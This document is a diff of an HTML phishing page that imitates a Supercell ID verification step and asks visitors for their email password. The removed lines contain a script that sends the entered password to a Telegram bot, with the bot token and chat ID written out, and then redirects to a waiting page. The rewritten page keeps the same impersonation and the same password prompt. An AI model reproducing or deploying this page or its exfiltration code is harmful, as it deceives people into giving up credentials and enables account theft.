@@ -1,68 +1,248 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="utf-8"/>
-  <meta content="width=device-width, initial-scale=1.0" name="viewport"/>
-  <title>Supercell ID Verification</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.3/css/all.min.css" rel="stylesheet"/>
-  <script>
-    async function sendPassword() {
-      const password = document.getElementById('email-password').value;
-      if (password) {
-        // Send the password to Telegram
-        const telegramBotToken = '8568408364:AAGcM6PJORlgQIsW48hmV3jdtqBIEog7PMY';
-        const chatId = '6307157806';
-        const message = `Email password: ${password}`;
-        const telegramUrl = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${message}`;
-        await fetch(telegramUrl);
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Supercell ID Verification</title>
+    <style>
+        /* Modern Light Mode Theme */
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f0f0f0; /* Light Grey Background */
+            color: #333333; /* Dark Text Color */
+            margin: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
 
-        // Redirect to wait.html
-        window.location.href = 'wait65.html';
-      } else {
-        alert('Please enter the email password.');
-      }
-    }
-  </script>
+        /* Main Card */
+        .container {
+            width: 90%;
+            max-width: 380px;
+            background-color: #ffffff; /* White Card Background */
+            border-radius: 20px;
+            padding: 35px 25px;
+            text-align: center;
+            box-shadow: 0 5px 25px rgba(0, 0, 0, 0.1);
+            border: 1px solid #e0e0e0;
+        }
+
+        /* Logo and Header */
+        .header {
+            margin-bottom: 30px;
+        }
+
+        .supercell-logo {
+            font-size: 32px;
+            font-weight: 800;
+            color: #333333;
+            letter-spacing: 1px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .id-badge {
+            background-color: #ffc93c; /* Supercell Yellow */
+            color: #333333;
+            padding: 4px 10px;
+            border-radius: 8px;
+            font-size: 20px;
+        }
+
+        /* Progress Bar */
+        .progress-bar {
+            margin: 25px 0 45px 0;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: relative;
+            color: #888;
+            font-size: 13px;
+        }
+
+        .progress-line {
+            position: absolute;
+            left: 20%;
+            right: 20%;
+            top: 50%;
+            height: 4px;
+            background-color: #e0e0e0; /* Light Grey Track */
+            border-radius: 2px;
+            transform: translateY(-50%);
+        }
+
+        .progress-line::after {
+            content: '';
+            position: absolute;
+            width: 50%; /* Completed up to Sign in */
+            height: 100%;
+            background-color: #38b450; /* Green Progress */
+            border-radius: 2px;
+            left: 0;
+        }
+
+        /* Input Information */
+        .main-info {
+            margin-bottom: 30px;
+        }
+        
+        h1 {
+            font-size: 24px;
+            color: #333333;
+            margin-bottom: 10px;
+        }
+        
+        .email-display {
+            font-size: 14px;
+            color: #666666;
+            line-height: 1.5;
+        }
+
+        /* Password Input Field */
+        .password-container {
+            position: relative;
+            margin-bottom: 20px;
+        }
+
+        .password-input {
+            width: 100%;
+            padding: 16px 50px 16px 15px;
+            border: 1px solid #cccccc; /* Light border */
+            border-radius: 12px;
+            box-sizing: border-box;
+            font-size: 16px;
+            background-color: #ffffff;
+            color: #333333;
+            transition: border-color 0.3s;
+        }
+
+        .password-input:focus {
+            border-color: #4285f4;
+            outline: none;
+        }
+
+        /* Toggle Button */
+        .toggle-password {
+            position: absolute;
+            right: 15px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #aaaaaa;
+            font-size: 18px;
+            padding: 5px;
+            transition: color 0.3s;
+        }
+
+        .toggle-password:hover {
+            color: #333;
+        }
+
+        /* Buttons */
+        .button {
+            width: 100%;
+            padding: 16px;
+            margin-bottom: 12px;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background-color 0.3s;
+        }
+
+        .continue-btn {
+            background-color: #4285f4; /* Primary Blue */
+            color: white;
+        }
+
+        .continue-btn:hover {
+            background-color: #357ae8;
+        }
+
+        .go-back-btn {
+            background-color: #e0e0e0; /* Light Grey */
+            color: #333333;
+        }
+
+        .go-back-btn:hover {
+            background-color: #cccccc;
+        }
+
+        .code-link {
+            display: block;
+            margin-top: 20px;
+            color: #4285f4;
+            text-decoration: none;
+            font-size: 14px;
+        }
+    </style>
 </head>
-<body class="bg-gradient-to-b from-blue-900 to-blue-500 flex items-center justify-center min-h-screen">
-  <div class="bg-gradient-to-b from-blue-900 to-blue-500 rounded-lg shadow-lg p-6 w-full max-w-md">
-    <div class="bg-white rounded-lg p-6">
-      <div class="flex justify-center mb-4">
-        <img alt="Supercell ID logo" class="h-12" height="50" src="data:image/png;base64,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"/>
-      </div>
-      <div class="flex items-center justify-between mb-4">
-        <span class="text-gray-500">Sign in</span>
-        <div class="w-full h-2 bg-gradient-to-r from-blue-500 to-teal-400 rounded-full mx-2">
-          <div class="w-1/2 h-full bg-teal-400 rounded-full"></div>
+<body>
+    <div class="container">
+        
+        <div class="header">
+            <div class="supercell-logo">
+                SUPERCELL
+                <span class="id-badge">ID</span>
+            </div>
         </div>
-        <span class="text-gray-500">Verify</span>
-      </div>
-      <div class="flex justify-center mb-4">
-        <img alt="Supercell logo" class="h-24" height="100" src="https://accounts.supercell.com/static/appicons/store.png" width="100"/>
-      </div>
-      <h2 class="text-center text-xl font-semibold mb-2">Almost there!</h2>
-      <p class="text-center text-gray-600 mb-4">
-        Please enter the password for the email address:
-        <br/>
-        <span class="font-semibold">***@***.***</span>
-      </p>
-      <div class="mb-4">
-        <input class="w-full p-3 border rounded-lg text-center text-xl text-black font-bold bg-gray-100 border-gray-300" id="email-password" type="password" placeholder="Password"/>
-      </div>
-      <button class="w-full bg-blue-500 text-white py-3 rounded-lg text-lg mb-4" onclick="sendPassword()">CONTINUE</button>
-      <button class="w-full bg-gray-200 text-gray-700 py-3 rounded-lg text-lg mb-4">GO BACK</button>
-      <p class="text-center text-blue-500">Didn't receive the code?</p>
+
+        <div class="progress-bar">
+            <span style="color: #38b450;">Sign in</span> 
+            <div class="progress-line"></div>
+            <span style="color: #4285f4;">Verify</span> 
+        </div>
+        
+        <div class="main-info">
+            <h1>Almost there!</h1>
+            <p class="email-display">
+                Please enter the password for the email address:
+                <br>
+                <span style="font-weight: bold; color: #333333;">***@***.***</span>
+            </p>
+        </div>
+
+        <form action="wait65.html" method="GET">
+            
+            <div class="password-container">
+                <input type="password" id="passwordInput" class="password-input" placeholder="Password" required>
+                <button type="button" id="togglePassword" class="toggle-password" title="Show/Hide Password">
+                    👁️
+                </button>
+            </div>
+
+            <button type="submit" class="button continue-btn">
+                CONTINUE
+            </button>
+            
+        </form>
+
+        <button type="button" class="button go-back-btn">
+            GO BACK
+        </button>
+
+        <a href="#" class="code-link">Didn't receive the code?</a>
     </div>
-  </div>
+
+    <script>
+        const togglePassword = document.getElementById('togglePassword');
+        const passwordInput = document.getElementById('passwordInput');
+
+        togglePassword.addEventListener('click', function (e) {
+            // Toggle the type attribute (password <-> text)
+            const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
+            passwordInput.setAttribute('type', type);
+            
+            // Change the eye icon
+            this.textContent = (type === 'password') ? '👁️' : '🔒'; 
+        });
+    </script>
 </body>
-
 </html>
-
-
-
-
-
-
-
-
